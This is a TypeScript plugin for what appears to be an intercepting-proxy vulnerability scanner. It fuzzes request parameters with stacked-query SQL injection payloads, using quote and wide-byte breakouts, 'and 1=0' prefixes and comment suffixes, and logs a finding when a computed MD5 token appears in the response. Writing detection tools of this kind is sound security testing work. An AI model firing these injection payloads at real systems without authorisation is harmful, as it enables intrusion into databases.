import { codec, Fuzz, FuzzParam, HttpUtils } from '@24wings/core';

import { encodeHex } from 'jsr:@std/encoding@0.221/hex';
import db from '../../../app/web/db.ts';
import { VulnerabilityLevel } from '../../../app/web/db/vuln.ts';
const pluginName = 'sql-stack-query';
export async function endpoint(request: Request) {
  const fuzz = await Fuzz.fromRequest(request);
  const params = fuzz.getAllFuzzableParams();
  if (params.length <= 0) return;

  for (let param of params) {
    param.name;
    let prefix = sqlBuildPrefix(param.value as string);
    let suffix = [' -- ', ' # '];

    const { results, token } = stackedPayloads();
    console.log('生成token:' + token);
    /* 最准确的 MD5 型 Payload 的检测 */
    var finished = false;
    await sqlInjectionCheck(prefix, suffix, results, token, request.url, param, fuzz);
  }
}

async function sqlInjectionCheck(
  prefix: string[],
  suffix: string[],
  payloads: string[],
  token: string,
  url: string,
  i: FuzzParam,
  fuzz: Fuzz,
) {
  let finished = false;

  for (const p of prefix) {
    for (const s of suffix) {
      if (finished) {
        console.log('Detected Finished');
        return;
      }

      for (const payload of payloads) {
        const finPayload = p + payload + s;
        console.log(`USE: prefix:${p} suffix:${s} payloads: ${JSON.stringify(payload)}`);

        try {
          const { response: rsp, request: payloadRequest } = await fuzz.sendModifiedRequest(
            Object.assign(i, { value: finPayload }),
          );
          const bodyStr = await (await rsp).clone().text();

          if (bodyStr.includes(token)) {
            console.log('Union Checking Token 生效了，Payload 为：' + finPayload);
            const count = (payload.match(/,/g) || []).length + 1;
            await db.tables.vuln.insertOne({
              url,
              type: 'sqlInjection',
              level: VulnerabilityLevel.Medium,
              payload,
              requestRaw: await HttpUtils.dumpRequest(payloadRequest),
              responseRow: bodyStr,
              pluginName,
            });
            finished = true;
            return;
          }
        } catch (err) {
          console.log(`FAILED: ${err}`);
          continue;
        }
      }
    }
  }
}

export function stackedPayloads(mod = 'md5') {
  let { expr, result } = Fuzz.fuzzCalcExpr();
  let basicItem = expr;
  let token = result + '';
  if (mod == 'md5') {
    basicItem = `md5(${basicItem})`;
    token = encodeHex(codec.md5(result + ''));
  }

  let payloads: string[] = [];
  payloads.push(basicItem);
  var results = [];
  for (let i = 0; i < 16; i++) {
    payloads.push(basicItem);
    let realPayload = `;\nselect ${payloads.join(',')}`;
    results.push(realPayload);
  }
  return { results, token };
}

// FILEPATH: e:/deno_mitm/plugins/flow-analyzer/plugins/sql-stack-query.ts

function sqlBuildPrefix(paramValue: string): string[] {
  const pureInt = /^\d+$/.test(paramValue);

  const wideByte = String.fromCharCode(Math.floor(Math.random() * (254 - 129 + 1)) + 129);
  const prefix: string[] = [];

  const valueList = [paramValue];
  const boundaryList = [' ', ')', '))'];

  let formatString = '%s';
  if (!pureInt) {
    formatString += wideByte + "'";
    valueList.push(generateRandomString(10));
  }
  formatString += '%s and 1=0 ';

  for (const v of valueList) {
    for (const b of boundaryList) {
      prefix.push(formatString.replace(/%s/g, (_, i) => i === 0 ? v : b));
    }
  }

  return prefix;
}

function generateRandomString(length: number): string {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
export default { name: pluginName, version: '1.0.0', endpoint };
